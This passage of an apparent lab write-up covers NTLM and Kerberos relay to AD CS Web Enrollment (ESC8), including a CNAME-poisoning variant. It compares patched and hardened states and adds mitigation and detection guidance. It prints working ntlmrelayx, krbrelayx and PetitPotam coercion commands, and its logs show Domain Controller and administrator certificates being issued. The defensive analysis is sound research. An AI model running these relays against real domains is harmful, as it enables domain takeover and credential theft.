Relay the coerced DC to HTTPS this time:

```bash
melid@hellforge$ impacket-ntlmrelayx -t https://ref-adcs.ref.htb/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
```

```
[*] (SMB): Received connection from 192.168.1.24, attacking target https://ref-adcs.ref.htb
[-] (SMB): Authenticating against https://ref-adcs.ref.htb as REF/REF-DC$ FAILED
```

It dies at authentication, earlier than the HTTP case. There is now a real TLS channel, EPA computes a channel binding token for it, and the relayed auth carries a token that belongs to a different channel (the attacker-to-CA one), so the CA rejects it before any CSR is generated. No certificate.

> **The EPA-over-HTTP trap.** This is the one I'd hammer on if you take nothing else away. EPA only does its job when there is a TLS channel to bind to, the channel binding token is derived from the TLS channel, so over plain HTTP there is nothing to bind and nothing to check. In this lab EPA only mattered once HTTPS was in play; every block I captured was against an HTTPS endpoint. I did not separately capture a "plain HTTP, `tokenChecking=Require`, cert still issued" run, but given how channel binding works I would not treat `tokenChecking=Require` on a plain-HTTP enrollment endpoint as a meaningful ESC8 mitigation. A lot of ESC8 guidance says "enable EPA" and stops there. That guidance is incomplete: it is HTTPS _and_ EPA together that shut the door.

**Over Kerberos.** To test the AD CS controls against Kerberos I hardened an *unpatched* CA, the same way I tested the NTLM controls early, because on a patched box the Kerberos relay never reaches the CA to be refused (the marshalled primitive is dead, as State 2 showed). With the unpatched box hardened, HTTPS required and the relay aimed at plain HTTP:

```bash
melid@hellforge$ python3 krbrelayx.py -t http://ref-adcs.ref.htb/certsrv/ --adcs --template DomainController -v 'REF-DC$' -debug
melid@hellforge$ nxc smb ref-dc -u lowpriv -p 'P@ssw0rd!' -M coerce_plus -o METHOD=PetitPotam LISTENER=ref-adcs1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA
```

```
[*] SMBD: Received connection from 192.168.1.24
[*] Status code returned: 403. Authentication does not seem required for URL
[-] No authentication requested by the server for url ref-adcs.ref.htb
[*] IIS cert server may allow anonymous authentication, sending NTLM auth anyways
[*] HTTP server returned status code 403, treating as a successful login
[*] Generating CSR...
[*] CSR generated!
[*] Getting certificate...
[-] Error getting certificate! Make sure you have entered valid certificate template.
```

`curl` confirms `HTTP:403`, the ticket reaches the CA, `krbrelayx` misreads the 403 and pushes a CSR, then `Error getting certificate!`, no PFX. Same shape as the NTLM HTTP case, judged by the absence of a certificate. Then add EPA and relay to HTTPS:

```bash
melid@hellforge$ python3 krbrelayx.py -t https://ref-adcs.ref.htb/certsrv/ --adcs --template DomainController -v 'REF-DC$' -debug
melid@hellforge$ nxc smb ref-dc -u lowpriv -p 'P@ssw0rd!' -M coerce_plus -o METHOD=PetitPotam LISTENER=ref-adcs1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA
```

```
[*] SMBD: Received connection from 192.168.1.24
[*] SMBD: Received connection from 192.168.1.24
[*] Generating CSR...
[*] CSR generated!
[*] Getting certificate...
[-] Error getting certificate! Make sure you have entered valid certificate template.
```
 One honest caveat on this last run: unlike the NTLM HTTPS case, which died with a clean channel-binding rejection at authentication, the `krbrelayx` HTTPS path failed later, at the issuance step, so the log shows `Error getting certificate!` rather than an explicit binding failure. The outcome is the same (no cert against HTTPS plus EPA), but I cannot say from this output alone that EPA's channel-binding check is what rejected it, versus another failure at the TLS or enrollment layer. The NTLM run is where the explicit EPA rejection is on tape; the Kerberos run confirms the hardened endpoint issues nothing.

For hardened *reflection* over Kerberos (SMB signing), I did not capture a separate run. Signing rejects the relayed session below the authentication layer, so the `STATUS_ACCESS_DENIED` it produces is not NTLM-specific and would land the same way over Kerberos; on a patched box the Kerberos reflection is already dead at the marshalled-name step regardless. I am reasoning that cell from where signing sits, and the NTLM `0xc0000022` capture above is the concrete evidence for the control.

### What the three states prove

| Path | Unpatched, default | Fully patched, default | Patched + correct control |
| --- | --- | --- | --- |
| Reflection (NTLM/Kerberos) | SYSTEM + SAM | **blocked** (marshalled name refused; plain coercion fails as `REF-MEMBER$`) | blocked (SMB signing, `0xc0000022`) |
| ESC8 relay (NTLM) | DC cert, then DA | **still works** (`GOT CERTIFICATE`) | blocked (HTTPS `403`, then EPA `FAILED`) |
| ESC8 relay (Kerberos, marshalled-name path) | DC cert (`GOT CERTIFICATE`) | **blocked** (marshalled primitive patched, `krbrelayx` silent) | blocked (HTTPS `403`, no cert over EPA) |

Reflection has two independent off switches, the patch and SMB signing, and they kill the attack at different points: the patch before any usable auth comes back, signing at the target refusing the unsigned session. ESC8 over NTLM has exactly one switch that counts, HTTPS plus EPA, and neither patching nor SMB signing touches it. They can't. The relay lands on HTTP, and SMB signing has no say over HTTP. ESC8 over Kerberos via the marshalled-name path is the odd one out, and the most interesting cell in the table: the patch *does* kill it, because that route needs the marshalled primitive to obtain a relayable ticket, whereas the NTLM route just needs any coerced authentication. So on a patched, unhardened CA, ESC8 is still live over NTLM and the marshalled-name Kerberos route is dead. Hold that result loosely, though: the CNAME section below brings Kerberos ESC8 back from the dead on the same patched box by sourcing the ticket a different way. For AD CS Web Enrollment, the control that covers both NTLM and Kerberos relay, whether the ticket came from the marshalled-name trick or the CNAME route, is on the target: HTTPS plus EPA. For SMB and LDAP the same principle applies but the knobs differ, SMB signing for SMB, LDAP signing and channel binding for LDAP. There is no single switch for every variant; there is one principle, enforced per service.

## The CNAME variant, and what the latest patch does about it

Everything above leans on the marshalled-name primitive, and on a patched box that primitive is dead. So the obvious question is whether there is another way to get a victim to request a relayable ticket. There is, and it is the [Cymulate](https://cymulate.com/blog/kerberos-authentication-relay-via-cname-abuse/) CNAME technique I mentioned earlier. The idea: poison DNS so the victim's lookup for some name returns a CNAME pointing at the target you actually want (the CA) plus an A record pointing at you. The Windows client follows the alias and builds its Kerberos service ticket using the canonical name as the SPN. No marshalled blob, and crucially it works against logged-on *user* accounts, not just machine accounts. I tested it with the modified mitm6 PoC from [BenZamir](https://github.com/BenZamir/MITM6-Kerberos-CNAME-Abuse), which implements the CNAME poisoning on top of Dirk-jan Mollema's [mitm6](https://github.com/dirkjanm/mitm6).

Getting this to fire taught me two things that the writeups gloss over, so here they are plainly.

First, the trigger protocol matters. My instinct was to trigger over SMB (`dir \\trigger.ref.htb\c$`), and it never worked. The SMB redirector failed to connect before it ever requested a service ticket, `klist` on the victim showed no ticket for the poisoned name at all, just the TGT. The HTTP path is what worked: a request the client services with Kerberos against the poisoned name makes it build an `HTTP/ref-adcs` ticket, which is exactly what you want to relay to web enrollment. So the CNAME-to-SPN behavior is protocol-specific in practice, and SMB did not cooperate in my lab even though DNS resolution was clearly poisoned (`Resolve-DnsName` returned the CNAME and the attacker A record cleanly).

Second, and this one is a practical warning if you run mitm6 in a live environment: turn it off before anyone logs into a machine with a domain account. mitm6's DHCPv6 takeover makes the attacker the primary DNS server, and during interactive domain logon that breaks name resolution badly enough to disrupt or hang the logon. Run the poisoning only for the window you need to catch a trigger, and stop it before logons happen, or you will cause exactly the kind of noticeable outage that gets an engagement noticed.

With the HTTP trigger, the unpatched, unhardened relay issued a certificate for the logged-on user:

```bash
melid@hellforge$ python3 krbrelayx.py -t http://ref-adcs.ref.htb/certsrv/certfnsh.asp --adcs --template User -debug
```

```
[*] HTTPD: Received connection from 192.168.1.25, prompting for authentication
[*] HTTPD: Client requested path: /
[*] HTTP server returned status code 200, treating as a successful login
[*] Generating CSR...
[*] GOT CERTIFICATE! ID 8
[*] Writing PKCS#12 certificate to ./unknown4808.pfx
```

That certificate is for the `administrator` user who was logged onto the victim, so PKINIT with it is a Domain Admin logon. ESC8 over Kerberos, against a user account, with no marshalled record anywhere. One template note that cost me a run: the enrollee here is a user, so the request must use the `User` template, not `Machine`. A user enrolling against `Machine` authenticates fine and then gets refused at issuance, which looks like a broken attack but is just a template mismatch.

To see what the January 2026 patch (CVE-2026-20929) actually changes, I ran a 2x2: patch state crossed with hardening state. Same CNAME trigger and `User` template throughout. The runs differ only by the relay target (plain HTTP for the unhardened cells, HTTPS for the hardened ones) and the box's patch state:

```bash
# unhardened cells
melid@hellforge$ python3 krbrelayx.py -t http://ref-adcs.ref.htb/certsrv/certfnsh.asp --adcs --template User -debug
# hardened cells
melid@hellforge$ python3 krbrelayx.py -t https://ref-adcs.ref.htb/certsrv/certfnsh.asp --adcs --template User -debug
```

The trigger on the victim is identical for every cell:

```powershell
klist purge
Invoke-WebRequest -UseDefaultCredentials -Uri http://trigger.ref.htb/ -UseBasicParsing
```

Patched plus plain HTTP still issued a cert, same as the unpatched-HTTP case (`ID 8`) shown above:

```
[*] HTTP server returned status code 200, treating as a successful login
[*] Generating CSR...
[*] GOT CERTIFICATE! ID 3
[*] Writing PKCS#12 certificate to ./unknown8869.pfx
```

Both hardened cells, patched and unpatched alike, failed at the same step:

```
[*] Generating CSR...
[*] CSR generated!
[*] Getting certificate...
[-] Error getting certificate! Make sure you have entered valid certificate template.
```

| | Unhardened (plain HTTP) | Hardened (HTTPS + EPA) |
| --- | --- | --- |
| **Unpatched** | cert issued (`GOT CERTIFICATE! ID 8`) | no cert (fails at issuance) |
| **Patched** | cert issued (`GOT CERTIFICATE! ID 3`) | no cert (fails at issuance) |

Read the columns. With patch state as the only difference, the outcome does not change: unpatched-HTTP and patched-HTTP both issue a cert, unpatched-HTTPS+EPA and patched-HTTPS+EPA both block. The variable that decides the result is the hardening, not the patch. Over plain HTTP the patch does nothing, which makes sense, channel binding needs a TLS channel to bind to, and there isn't one. Over HTTPS with EPA the relay is refused whether or not the patch is present.

Now the honest limits of that result, because it is easy to over-read. Both hardened cells failed at the same point, the issuance step, with the same generic `Error getting certificate!`, rather than the clean auth-layer channel-binding rejection the NTLM HTTPS run produced. So I cannot cleanly attribute the block to EPA's channel binding specifically versus another enrollment-layer refusal, and because both hardened cells fail identically, this experiment cannot isolate what CVE-2026-20929 contributes on this endpoint. There is a plausible reason it looks inert here: AD CS web enrollment is fronted by IIS, and the EPA I configured (`tokenChecking:Require`) is enforced at the IIS Windows-authentication layer, which already rejects a channel-binding-less relay independent of the HTTP.sys-level CBT the patch backports. The CVE's HTTP.sys change is more likely to be the deciding factor for raw HTTP.sys services that are not sitting behind IIS's own EPA. I did not test a non-IIS HTTP.sys target, so I am flagging that as a hypothesis, not a result.

The takeaway is the same one the rest of the post keeps arriving at, now from a third independent angle: the configuration control did the work, and the code patch, on its own and on this endpoint, did not. To state the result as narrowly as it deserves: in my AD CS Web Enrollment lab, CVE-2026-20929 did not change the outcome by itself. Plain HTTP still issued a certificate, and HTTPS plus EPA blocked both the patched and unpatched cases. I did not test a raw HTTP.sys service outside IIS, so I would not generalise that beyond this endpoint, the patch may well be the deciding factor for HTTP.sys services that are not already behind IIS's own EPA enforcement.

Cymulate's researchers reach the same conclusion in their own write-up, and it is worth repeating the principle because they put it well: protection against Kerberos relay is enforced at the service level, not at the authentication-protocol level. The CVE-2026-20929 patch hardens one target (HTTP.sys) and leaves the CNAME coercion primitive itself intact, so it reduces exposure for HTTP services without removing the underlying technique. Their broader point lands the same way my testing did: disabling NTLM or "moving to Kerberos" does not eliminate relay risk, because every Kerberos-enabled service (SMB, HTTP, LDAP, and the rest) has to enforce its own anti-relay protection, signing or channel binding, independently. Kerberos stays a viable relay vector for any service that does not. That is the whole argument for treating this as a configuration problem you own rather than a CVE you wait on.

## Mitigation: config versus patch

The framing I keep coming back to is splitting these into config-dependent and patch-dependent, because they fail differently and you fix them differently.

Config-dependent attacks don't care about your patch level. A fully patched box with an unhardened service is still wide open; State 2 above is the proof. You fix these with policy, and the exact commands are in State 3:

- **Enforce SMB signing everywhere.** This is the big one. A required-signing target rejects the relayed session, which collapses the whole SMB reflection and relay class, including CVE-2025-33073 on an unpatched host. Signing alone defeats the bug.
- **Bind authentication to the service channel.** For HTTP targets such as AD CS Web Enrollment, require HTTPS and Extended Protection. For LDAP/LDAPS, enforce LDAP signing and LDAP channel binding separately. The principle is the same, but the knobs are service-specific. The caveat the lab beat into me applies to the HTTP side: EPA on plain HTTP is inert, there is no TLS channel for the token to bind to, so for AD CS that means HTTPS _and_ EPA together, and ideally turning off NTLM to the endpoint entirely.
- **Restrict who can write DNS records.** Low-priv users creating arbitrary records is what makes the marshalled-name trick possible in the first place. Tighten the zone ACLs.

Patch-dependent attacks need the actual code bug present, and the only fix there is the update: apply June _and_ October 2025 and keep current. There's a newer one worth tracking too. In January 2026 Microsoft shipped CVE-2026-20929, which backports Channel Binding Token support into HTTP.sys itself across supported Windows versions. This is the platform-level answer to the Kerberos CNAME relay technique, and it hardens the HTTP target directly rather than the coercion. Two things to keep in mind about it: it only covers the HTTP relay path, so other protocols stay exposed if you haven't enforced signing and binding on them, and it does nothing to stop the coercion primitive underneath. It also leans the same way the platform defaults have started to move, though the detail matters here. SMB signing has two separate requirements, outbound (the client's traffic) and inbound (traffic to the server), and a host can require either, both, or neither. Per [Microsoft's SMB signing documentation](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-signing), Windows 11 24H2 (Enterprise, Pro, Education) requires both, but Windows Server 2025 requires only outbound signing by default. That distinction is the whole game for relay defense: what stops a relayed or reflected session is the target requiring signing on the *inbound* side, because the target is acting as an SMB server. A default Server 2025 box requires outbound only, so "Server 2025 signs by default" does not mean it is safe as a relay target. New Server 2025 domain controllers do require LDAP signing by default through a new enforcement policy ([Microsoft's LDAP signing documentation](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-signing) has the details; note that LDAP channel binding is still not enforced by default, only "when supported" on new 2025 installs, and upgrades keep whatever they had). The baseline is drifting toward "hardened out of the box," but you have to know which knob you are reading, which is exactly why a stock 2022 RTM lab like mine is so easy to pop and a current, deliberately hardened install is not.

The takeaway, after running all of this: patching shuts specific doors one at a time, but signing and channel binding take away the room. That's not a slogan. SMB signing stopped this bug on a box that had no patch for it yet, and a code patch did nothing for ESC8 on a box that was fully current. Defense in depth here is the difference between the two.

## Detection and the blue-team view

Reflection leaves prints. On the wire, a reflected exchange sets `NTLMSSP_NEGOTIATE_LOCAL_CALL` in the challenge and the final authenticate message comes back nearly empty, both signs of local NTLM auth happening where it has no business happening. DNS records dragging long marshalled suffixes are the other loud tell.

On the host, watch for source-workstation mismatches in the auth logs: a logon that claims to be local while the connection plainly came from somewhere else. Correlate logon (4624), special-privilege assignment (4672), and process creation (4688) to catch a SYSTEM context showing up with no legitimate local auth behind it. Service creation followed by SAM or LSASS access is the classic tail end of a successful reflection.

The CNAME variant widens what you need to watch, because the tell moves into DNS and Kerberos rather than staying in NTLM. The minimum telemetry I would want across everything this post covers:

- **DNS:** long marshalled records, unexpected dynamic-DNS writes, suspicious CNAME chains, and short-lived records pointing sensitive service names at odd IPs.
- **Kerberos:** unusual TGS requests for `HTTP/<ca-name>` or `cifs/<unexpected-name>`, and service tickets that appear immediately after a DNS change.
- **AD CS:** unexpected certificate issuance for machine accounts or privileged users, especially `DomainController` and `User` template requests coming from unusual clients.
- **Host:** the 4624/4672/4688 correlation above, plus RemoteRegistry start, service creation, and SAM or LSASS access.
- **Network:** SMB or HTTP authentication flows where the resolved DNS target, the SPN in the ticket, and the actual connection destination do not line up.

For the CNAME path specifically, CrowdStrike published a [detection write-up for CVE-2026-20929](https://www.crowdstrike.com/en-us/blog/detecting-kerberos-relay-attack-via-dns-cname-abuse/) focused on Kerberos relay via DNS CNAME abuse against AD CS, which is a good starting point for the DNS-and-Kerberos correlation that NTLM-era reflection detection misses.

## Tools

All standard, all maintained by the community for years. [Impacket](https://github.com/fortra/impacket)'s `ntlmrelayx` does the heavy lifting for NTLM relay and reflection; Dirk-jan Mollema's [krbrelayx](https://github.com/dirkjanm/krbrelayx) handles the Kerberos variants and ships the `dnstool.py` I used to write the DNS record (krbrelayx needs one small edit to advertise Kerberos-only). For coercion I leaned on [NetExec](https://github.com/Pennyw0rth/NetExec)'s `coerce_plus` module, with p0dalirius's [Coercer](https://github.com/p0dalirius/Coercer) as the fallback, but PetitPotam and the rest of the "potato" family all work, anything that gets the victim to authenticate over SMB. Turning a relayed AD CS certificate into a domain dump is Oliver Lyak's [Certipy](https://github.com/ly4k/Certipy) for the PKINIT-to-TGT step, then `secretsdump` for the DCSync. Genuine thanks to all of these authors; this post is standing on their work.

---

_A note on process: I used an AI assistant to help with grammar and clarity on this post. The structure, the technical content, and the opinions are mine._
